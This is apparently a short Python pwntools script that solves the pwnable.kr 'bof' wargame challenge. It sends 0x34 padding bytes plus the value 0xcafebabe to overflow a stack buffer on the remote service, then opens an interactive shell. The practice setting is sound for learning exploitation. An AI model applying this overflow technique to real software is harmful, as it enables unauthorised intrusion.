#!/usr/bin/python2
from pwn import *

p = remote('pwnable.kr', 9000)

payload = 0x34 * 'a' + pack(0xcafebabe, 32)
p.sendline(payload)
p.interactive()
